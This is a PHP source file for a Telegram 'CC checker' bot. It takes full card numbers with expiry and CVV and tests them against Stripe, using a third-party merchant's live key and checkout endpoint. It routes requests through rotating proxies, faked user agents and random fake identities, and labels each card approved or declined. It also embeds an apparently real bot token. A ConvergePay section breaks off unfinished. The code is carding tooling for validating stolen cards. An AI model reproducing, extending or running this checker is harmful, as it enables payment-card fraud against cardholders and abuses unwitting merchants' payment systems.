<?php

////////////////=============[Made with ❤️ by AndryMata]===============////////////////

///https://api.telegram.org/bot1500301061:AAFV3h-_4cxTR5xtubqDiuXInajtLsubKj0/setwebhook?url=https://ibz121.000webhostapp.com/Andry%20bot%20raw%20cpay%20-%20IBZ.php

$botToken = "1500301061:AAFV3h-_4cxTR5xtubqDiuXInajtLsubKj0"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if ((strpos($message, "!start") === 0)||(strpos($message, "/start") === 0)){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by: Lucas</b>");
}

//////////=========[Cmds Command]=========//////////

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u>Convergepay:</u> <code>!cpay</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Stripe:</u> <code>!chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Info:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: Lucas</b>");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>Bot Made by: Lucas </b>");
}

//////////=========[Bin Command]=========//////////

elseif ((strpos($message, "!bin") === 0)||(strpos($message, "/bin") === 0)){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}
curl_close($ch);

 
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Lucas </b>');
}
curl_close($ch);

//////////////////////////===========RANDOM USER AGENT=============///////////////////////////////////
function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
                'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}
$ua = random_ua();


//////////////////////////===========RANDOM USER AGENT=============///////////////////////////////////

//////////=========[Chk Command]=========//////////

if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////===[Randomizing Details 

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Proxys]===//////////////

$rp1 = array(
  1 => 'user-rotate:pass',
  2 => 'user-rotate:pass',
  3 => 'user-rotate:pass',
  4 => 'user-rotate:pass',
  5 => 'user-rotate:pass',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

////////////////////////////////////////////

////////////////////////////==============[Proxy Section]===============//////////////////////////////

$url = "https://api.ipify.org/";   

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}

//echo '[ IP: '.$ip.' ] ';

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////=[1st REQ]=/////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
   ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$firstname.'12422@gmail.com&billing_details[address][postal_code]='.$zip.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=6be45c75-317d-451d-bfed-2d11c3dde267dfbad0&muid=6545d106-1ccf-4bfd-931b-6497f5fcede803ad07&sid=dca7d15b-cbdd-46e7-a738-114fda398bfc8f6b5b&pasted_fields=number&payment_user_agent=stripe.js%2F0ae2fa9a7%3B+stripe-js-v3%2F0ae2fa9a7&time_on_page=88506&referrer=https%3A%2F%2Fxtremehiphopwithphil.muvi.com%2F&key=pk_live_jorzrn0U4RJVnJ178M88dUr8');

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 curl_close($ch);

//////////////=[2nd Req]=//////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://xtremehiphopwithphil.muvi.com/en/user/processCardSCA');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: xtremehiphopwithphil.muvi.com',
'accept: */*',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded;application/json',
'origin: https://xtremehiphopwithphil.muvi.com',
'referer: https://xtremehiphopwithphil.muvi.com/en/user/register',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
'x-requested-with: XMLHttpRequest',

   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'{"payment_method_id":"'.$id.'","is_sca":1,"email":"'.$firstname.'14267@gmail.com","description":"Creation of New customer","plan_id":"2989","currency_id":"153","is_sepa":"0","is_subscription_buldle":0,"is_api":0}');
  $result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b> 『 ★ CCN LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b> 『 ★ CCN MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: AndryMata</b>');
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}

//////////=========[Convergepay Command]=========//////////
elseif ((strpos($message, "!cpay") === 0)||(strpos($message, "/cpay") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon   = $i[1];
$year  = $i[2];
$year1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];



function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
}


if(strlen($year) == 4){
$year = substr($year, 2);
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$first = ucfirst(str_shuffle('Kurumi'));
$last = ucfirst(str_shuffle('appisbest'));
$com = ucfirst(str_shuffle('waifuu'));
$first1 = str_shuffle("kurumiapp85246");
$email = "".$first1."%40gmail.com";
$address = "".rand(0000,9999)."+Main+Street";
$ip = ''.rand(00,99).'.'.rand(000,999).'.'.rand(000,999).'.'.rand(00,99).'';
$mip = ''.rand(00,99).'.'.rand(00,99).'.'.rand(000,999).'.'.rand(00,99).'';
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$account = rand(000000,999999);
$invoice = rand(000000,999999);
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$state = "New+York";
$zip = "10080";
$city = "New+York";
}
elseif ($state == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($state == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($state == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange+Park";
}
else{
$state = "California";
$zip = "90201";
$city = "Bell";
};


//////////////////=================[Seesion ID]=================//////////////////

function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}

$email = emailGenerate();
// use $email for random email generate


// COOKIE PHP SESS ID

